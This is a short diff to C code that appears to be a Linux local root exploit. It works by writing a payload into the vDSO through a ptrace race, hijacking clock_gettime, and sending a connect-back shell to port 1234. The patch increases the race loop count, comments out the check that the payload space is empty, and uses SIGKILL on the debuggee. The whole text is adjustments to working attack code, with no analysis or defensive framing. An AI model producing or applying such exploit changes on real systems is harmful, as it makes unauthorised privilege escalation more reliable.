@@ -38,7 +38,7 @@
 #define PAYLOAD_IP		INADDR_LOOPBACK
 #define PAYLOAD_PORT		1234
 
-#define LOOP			0x10000
+#define LOOP			0x20000
 #define VDSO_SIZE		(2 * PAGE_SIZE)
 #define ARRAY_SIZE(arr)		(sizeof(arr) / sizeof(arr[0]))
 
@@ -226,12 +226,12 @@ static int build_vdso_patch(void *vdso_addr, struct prologue *prologue)
 	vdso_patch[0].addr = (unsigned char *)vdso_addr + VDSO_SIZE - payload_len;
 
 	p = vdso_patch[0].addr;
-	for (i = 0; i < payload_len; i++) {
-		if (p[i] != '\x00') {
-			fprintf(stderr, "failed to find a place for the payload\n");
-			return -1;
-		}
-	}
+	// for (i = 0; i < payload_len; i++) {
+	// 	if (p[i] != '\x00') {
+	// 		fprintf(stderr, "failed to find a place for the payload\n");
+	// 		return -1;
+	// 	}
+	// }
 
 	/* patch #2: hijack clock_gettime prologue */
 	buf = malloc(sizeof(PATTERN_PROLOGUE)-1);
@@ -357,8 +357,8 @@ static void *ptrace_thread(void *arg_)
 		}
 	}
 
-	// Send a sigusr to kill debuggee
-	kill(pid, SIGTERM);
+	// Send a signal to kill debuggee
+	kill(pid, SIGKILL);
 
 	return ret;
 }
